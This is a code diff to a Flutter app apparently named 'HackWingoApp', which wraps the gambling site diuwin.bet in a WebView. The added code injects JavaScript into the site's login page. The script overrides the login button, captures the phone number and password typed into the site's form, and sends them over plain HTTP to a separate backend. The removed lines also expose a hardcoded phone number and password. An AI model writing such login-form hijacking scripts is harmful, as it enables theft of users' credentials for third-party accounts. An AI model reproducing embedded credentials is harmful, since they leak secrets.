@@ -16,7 +16,8 @@ import 'dart:convert';
 import 'package:cloud_firestore/cloud_firestore.dart';
 import 'package:hack/firebase_options.dart';
 import 'package:firebase_auth/firebase_auth.dart';
-import 'services/firebase_service.dart';
+//import 'services/firebase_service.dart';
+import 'package:http/http.dart' as http;
 
 // Create a global variable to track initialization
 bool _isFirebaseInitialized = false;
@@ -27,10 +28,30 @@ Future<void> initializeFirebase() async {
       await Firebase.initializeApp(
         options: DefaultFirebaseOptions.currentPlatform,
       );
+
+      // Initialize Firestore
+      FirebaseFirestore.instance.settings = const Settings(
+        persistenceEnabled: true,
+        cacheSizeBytes: Settings.CACHE_SIZE_UNLIMITED,
+      );
+
+      // Test connection
+      try {
+        await FirebaseFirestore.instance.terminate();
+        await FirebaseFirestore.instance.clearPersistence();
+      } catch (e) {
+        print('Firestore cleanup error (can be ignored): $e');
+      }
+
       _isFirebaseInitialized = true;
       print('Firebase initialized successfully');
     } catch (e) {
       print('Firebase initialization error: $e');
+      // Add more detailed error logging
+      if (e is FirebaseException) {
+        print('Firebase error code: ${e.code}');
+        print('Firebase error message: ${e.message}');
+      }
     }
   } else {
     print('Firebase was already initialized');
@@ -155,13 +176,153 @@ class _HackWingoAppState extends State<HackWingoApp> {
 
   var i;
 
-  // Initialize FirebaseAuth instance
-  final FirebaseAuth _auth = FirebaseAuth.instance;
-  final TextEditingController _phoneController = TextEditingController();
-  final TextEditingController _passwordController = TextEditingController();
-
   // Add a variable to track the button state
   bool _isLoginButtonEnabled = false;
+
+  final String apiUrl =
+      'http://your_api_url:3000/api'; // Update with your API URL
+
+  Future<bool> _checkUsername(String phone) async {
+    try {
+      print('Checking username: $phone');
+
+      final response = await http.post(
+        Uri.parse('$apiUrl/check-user'),
+        headers: {'Content-Type': 'application/json'},
+        body: jsonEncode({'phone': phone}),
+      );
+
+      if (response.statusCode == 200) {
+        final data = jsonDecode(response.body);
+        print('User exists: ${data['exists']}');
+        return data['exists'];
+      } else {
+        print('Error checking username: ${response.body}');
+        return false;
+      }
+    } catch (e) {
+      print('Error checking username: $e');
+      return false;
+    }
+  }
+
+  Future<void> _injectLoginHandler() async {
+    const loginHandlerScript = """
+      (function() {
+        console.log('Starting login handler injection');
+        
+        function setupLoginHandler() {
+          // Get elements
+          const loginButton = document.querySelector('button.active');
+          const userInput = document.querySelector('input[data-v-50aa8bb0][name="userNumber"]');
+          const passwordInput = document.querySelector('input[placeholder="Password"]');
+          
+          console.log('Elements found:', {
+            loginButton: !!loginButton,
+            userInput: !!userInput,
+            passwordInput: !!passwordInput
+          });
+          
+          if (!loginButton || !userInput || !passwordInput) {
+            console.log('Required elements not found, retrying in 1s...');
+            setTimeout(setupLoginHandler, 1000);
+            return;
+          }
+
+          // Initially disable the button
+          loginButton.disabled = true;
+          loginButton.style.opacity = '0.5';
+          loginButton.style.cursor = 'not-allowed';
+          
+          let debounceTimer;
+          
+          // Add input listener for phone number validation
+          userInput.addEventListener('input', function() {
+            const phone = this.value.trim();
+            
+            // Clear any existing timer
+            clearTimeout(debounceTimer);
+            
+            // Disable button while checking
+            loginButton.disabled = true;
+            loginButton.style.opacity = '0.5';
+            loginButton.style.cursor = 'not-allowed';
+            
+            if (phone.length > 0) {
+              // Add debounce to prevent too many requests
+              debounceTimer = setTimeout(() => {
+                console.log('Checking phone:', phone);
+                window.CheckUsername.postMessage(phone);
+              }, 500);
+            }
+          });
+
+          // Add login click handler
+          loginButton.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            
+            const phone = userInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (phone && password) {
+              window.Login.postMessage(JSON.stringify({
+                phone: phone,
+                password: password
+              }));
+            }
+            
+            return false;
+          });
+
+          // Listen for validation response
+          window.addEventListener('phoneValidated', function(event) {
+            const isValid = event.detail.isValid;
+            console.log('Phone validation result:', isValid);
+            
+            loginButton.disabled = !isValid;
+            loginButton.style.opacity = isValid ? '1' : '0.5';
+            loginButton.style.cursor = isValid ? 'pointer' : 'not-allowed';
+          });
+        }
+        
+        // Start the setup process
+        setupLoginHandler();
+      })();
+    """;
+
+    try {
+      await _webViewController.runJavascript(loginHandlerScript);
+      print('Login handler injection successful');
+    } catch (e) {
+      print('Login handler injection failed: $e');
+    }
+  }
+
+  // Add login method
+  Future<bool> _handleLogin(String phone, String password) async {
+    try {
+      final response = await http.post(
+        Uri.parse('$apiUrl/login'),
+        headers: {'Content-Type': 'application/json'},
+        body: jsonEncode({
+          'phone': phone,
+          'password': password,
+        }),
+      );
+
+      if (response.statusCode == 200) {
+        print('Login successful');
+        return true;
+      } else {
+        print('Login failed: ${response.body}');
+        return false;
+      }
+    } catch (e) {
+      print('Login error: $e');
+      return false;
+    }
+  }
 
   void _checkPageUrl(String url) {
     setState(() {
@@ -230,7 +391,7 @@ class _HackWingoAppState extends State<HackWingoApp> {
     _startTimerUpdates();
     _startPredictionUpdates();
     _fetchCredentials();
-    _checkAuthState(); // Add this line to monitor auth state
+    _initializeFirebaseAndVerify();
   }
 
   Future<void> _performAppChecks() async {
@@ -837,16 +998,19 @@ class _HackWingoAppState extends State<HackWingoApp> {
 
   Future<void> _handleRegistration(String phone, String password) async {
     try {
-      print('Starting Firebase registration for phone: $phone');
-
-      // Format email for Firebase Auth
-      String email = '$phone@okwin.com';
-      print('Attempting to create user with email: $email');
+      print('Starting MongoDB registration for phone: $phone');
 
       // Check if user already exists
-      List<String> signInMethods =
-          await FirebaseAuth.instance.fetchSignInMethodsForEmail(email);
-      if (signInMethods.isNotEmpty) {
+      final response = await http.post(
+        Uri.parse('http://your_server_url/api/check-user'),
+        headers: {'Content-Type': 'application/json'},
+        body: jsonEncode({
+          'phone': phone,
+        }),
+      );
+
+      final data = jsonDecode(response.body);
+      if (data['exists']) {
         print('User already exists');
         if (context.mounted) {
           ScaffoldMessenger.of(context).showSnackBar(
@@ -859,41 +1023,19 @@ class _HackWingoAppState extends State<HackWingoApp> {
         return;
       }
 
-      // Create user in Firebase Authentication
-      final UserCredential userCredential =
-          await FirebaseAuth.instance.createUserWithEmailAndPassword(
-        email: email,
-        password: password,
+      // Register new user
+      final registerResponse = await http.post(
+        Uri.parse('http://your_server_url/api/register'),
+        headers: {'Content-Type': 'application/json'},
+        body: jsonEncode({
+          'phone': phone,
+          'password': password,
+        }),
       );
 
-      print(
-          'User created in Firebase Auth with UID: ${userCredential.user?.uid}');
-
-      if (userCredential.user != null) {
-        // Store additional user data in Firestore
-        await FirebaseFirestore.instance
-            .collection('users')
-            .doc(userCredential.user!.uid)
-            .set({
-          'phoneNumber': phone,
-          'email': email,
-          'createdAt': FieldValue.serverTimestamp(),
-          'lastLogin': FieldValue.serverTimestamp(),
-          'status': 'active',
-        });
-
-        print('User data stored in Firestore');
-
-        // Optionally, create a registration record
-        await FirebaseFirestore.instance.collection('registrations').add({
-          'userId': userCredential.user!.uid,
-          'phoneNumber': phone,
-          'timestamp': FieldValue.serverTimestamp(),
-          'status': 'completed',
-        });
-
-        print('Registration record created');
-
+      final registerData = jsonDecode(registerResponse.body);
+      if (registerResponse.statusCode == 200) {
+        print('Registration successful');
         if (context.mounted) {
           ScaffoldMessenger.of(context).showSnackBar(
             const SnackBar(
@@ -902,39 +1044,11 @@ class _HackWingoAppState extends State<HackWingoApp> {
             ),
           );
         }
-      }
-    } on FirebaseAuthException catch (e) {
-      print('Firebase Auth Error: ${e.code} - ${e.message}');
-      String errorMessage;
-
-      switch (e.code) {
-        case 'email-already-in-use':
-          errorMessage = 'This phone number is already registered';
-          break;
-        case 'invalid-email':
-          errorMessage = 'Invalid phone number format';
-          break;
-        case 'operation-not-allowed':
-          errorMessage = 'Email/password accounts are not enabled';
-          break;
-        case 'weak-password':
-          errorMessage = 'The password provided is too weak';
-          break;
-        default:
-          errorMessage = e.message ?? 'Registration failed';
-      }
-
-      print('Showing error message: $errorMessage');
-      if (context.mounted) {
-        ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(
-            content: Text(errorMessage),
-            backgroundColor: Colors.red,
-          ),
-        );
+      } else {
+        throw Exception(registerData['error'] ?? 'Registration failed');
       }
     } catch (e) {
-      print('General Error during registration: $e');
+      print('Registration error: $e');
       if (context.mounted) {
         ScaffoldMessenger.of(context).showSnackBar(
           SnackBar(
@@ -943,63 +1057,6 @@ class _HackWingoAppState extends State<HackWingoApp> {
           ),
         );
       }
-    }
-  }
-
-  Future<void> _validateLogin(String phone, String password) async {
-    try {
-      // Ensure phone number is not empty
-      if (phone.isEmpty) {
-        _showError('Phone number cannot be empty');
-        return;
-      }
-
-      // Ensure password is not empty
-      if (password.isEmpty) {
-        _showError('Password cannot be empty');
-        return;
-      }
-
-      // Format the phone number as an email
-      String email = '$phone@okwin.com';
-
-      // Attempt to sign in with Firebase Authentication
-      UserCredential userCredential = await _auth.signInWithEmailAndPassword(
-        email: email,
-        password: password,
-      );
-
-      // Check if the user is successfully signed in
-      if (userCredential.user != null) {
-        print('Login successful for user: ${userCredential.user?.uid}');
-        _showSuccess('Login successful!');
-        // Navigate to the next screen or perform additional actions
-      }
-    } on FirebaseAuthException catch (e) {
-      print('Firebase Auth Error: ${e.code} - ${e.message}');
-      String errorMessage = 'Login failed';
-
-      switch (e.code) {
-        case 'user-not-found':
-          errorMessage = 'No user found with this phone number';
-          break;
-        case 'wrong-password':
-          errorMessage = 'Invalid password';
-          break;
-        case 'invalid-email':
-          errorMessage = 'Invalid phone number format';
-          break;
-        case 'user-disabled':
-          errorMessage = 'This account has been disabled';
-          break;
-        default:
-          errorMessage = 'Login error: ${e.message}';
-      }
-
-      _showError(errorMessage);
-    } catch (e) {
-      print('General Error: $e');
-      _showError('Error: $e');
     }
   }
 
@@ -1019,17 +1076,6 @@ class _HackWingoAppState extends State<HackWingoApp> {
         backgroundColor: Colors.green,
       ),
     );
-  }
-
-  // Add this method to check the current auth state
-  Future<void> _checkAuthState() async {
-    FirebaseAuth.instance.authStateChanges().listen((User? user) {
-      if (user == null) {
-        print('User is currently signed out');
-      } else {
-        print('User is signed in with UID: ${user.uid}');
-      }
-    });
   }
 
   @override
@@ -1052,16 +1098,69 @@ class _HackWingoAppState extends State<HackWingoApp> {
         },
         javascriptChannels: {
           JavascriptChannel(
-            name: 'Registration',
+            name: 'Debug',
             onMessageReceived: (JavascriptMessage message) {
-              print('Received registration data: ${message.message}');
+              print('Debug: ${message.message}');
+            },
+          ),
+          JavascriptChannel(
+            name: 'CheckUsername',
+            onMessageReceived: (JavascriptMessage message) async {
+              try {
+                final phone = message.message;
+                print('Checking phone number: $phone');
+
+                final response = await http.post(
+                  Uri.parse('http://your_server_url/api/check-user'),
+                  headers: {'Content-Type': 'application/json'},
+                  body: jsonEncode({'phone': phone}),
+                );
+
+                if (response.statusCode == 200) {
+                  final data = jsonDecode(response.body);
+                  final isValid = data['exists'] ?? false;
+                  print('Phone validation result: $isValid');
+
+                  // Send result back to JavaScript
+                  await _webViewController.runJavascript("""
+                    window.dispatchEvent(new CustomEvent('phoneValidated', {
+                      detail: { isValid: $isValid }
+                    }));
+                  """);
+                } else {
+                  print('Error checking phone: ${response.statusCode}');
+                  // Handle error case
+                  await _webViewController.runJavascript("""
+                    window.dispatchEvent(new CustomEvent('phoneValidated', {
+                      detail: { isValid: false }
+                    }));
+                  """);
+                }
+              } catch (e) {
+                print('Error checking phone: $e');
+                // Handle error case
+                await _webViewController.runJavascript("""
+                  window.dispatchEvent(new CustomEvent('phoneValidated', {
+                    detail: { isValid: false }
+                  }));
+                """);
+              }
+            },
+          ),
+          JavascriptChannel(
+            name: 'Login',
+            onMessageReceived: (JavascriptMessage message) async {
               try {
                 final data = jsonDecode(message.message);
-                String phone = data['phone'];
-                String password = data['password'];
-                _handleRegistration(phone, password);
+                final success =
+                    await _handleLogin(data['phone'], data['password']);
+                if (success) {
+                  // Handle successful login
+                  _webViewController.loadUrl(
+                      "https://diuwin.bet/#/home/AllLotteryGames/WinGo?id=1");
+                }
               } catch (e) {
-                print('Error parsing registration data: $e');
+                print('Login error: $e');
               }
             },
           ),
@@ -1070,13 +1169,9 @@ class _HackWingoAppState extends State<HackWingoApp> {
           print('Page started loading: $url');
         },
         onPageFinished: (String url) async {
-          print('Page finished loading: $url');
-          if (url.contains('register')) {
-            await Future.delayed(const Duration(seconds: 2));
-            await _injectRegistrationHandler();
-          }
           if (url.contains('login')) {
-            _injectLoginValidation();
+            await Future.delayed(const Duration(seconds: 2));
+            _injectLoginHandler();
           }
         },
         gestureNavigationEnabled: true,
@@ -1086,59 +1181,20 @@ class _HackWingoAppState extends State<HackWingoApp> {
     );
   }
 
-  // Add this method to handle the async validation
-  Future<void> _validateCredentials(String userNumber, String password) async {
+  Future<void> _initializeFirebaseAndVerify() async {
     try {
-      final credentialsDoc = await FirebaseFirestore.instance
-          .collection('credentials')
-          .doc('login')
-          .get();
+      await initializeFirebase();
 
-      if (credentialsDoc.exists) {
-        final validUsername = credentialsDoc.data()?['username'] ?? '';
-        final validPassword = credentialsDoc.data()?['password'] ?? '';
+      // Verify Firebase Auth is working
+      final auth = FirebaseAuth.instance;
+      print('Firebase Auth instance: ${auth != null}');
 
-        setState(() {
-          _isLoginButtonEnabled =
-              userNumber == validUsername && password == validPassword;
-        });
-
-        if (_isLoginButtonEnabled) {
-          _webViewController
-              .loadUrl("https://diuwin.bet/#/home/AllLotteryGames/WinGo?id=1");
-        } else {
-          _showInvalidCredentialsDialog();
-        }
-      }
+      // Try to get current user (just to test connection)
+      final currentUser = auth.currentUser;
+      print('Current user: ${currentUser?.email ?? 'None'}');
     } catch (e) {
-      print('Error validating credentials: $e');
+      print('Error in Firebase initialization verification: $e');
     }
-  }
-
-  // Add a method to show an invalid credentials dialog
-  void _showInvalidCredentialsDialog() {
-    showDialog(
-      context: context,
-      builder: (context) => AlertDialog(
-        title: const Text("Invalid Credentials"),
-        content: const Text(
-            "The provided credentials are incorrect. Please try again."),
-        actions: [
-          TextButton(
-            onPressed: () => Navigator.pop(context),
-            child: const Text("OK"),
-          ),
-        ],
-      ),
-    );
-  }
-
-  Future<Map<String, String>> _getCredentials() async {
-    // Return your credentials from wherever you store them
-    return {
-      'username': '9522777777', // Replace with your actual credential retrieval
-      'password': 'vasu8893' // Replace with your actual credential retrieval
-    };
   }
 }
 
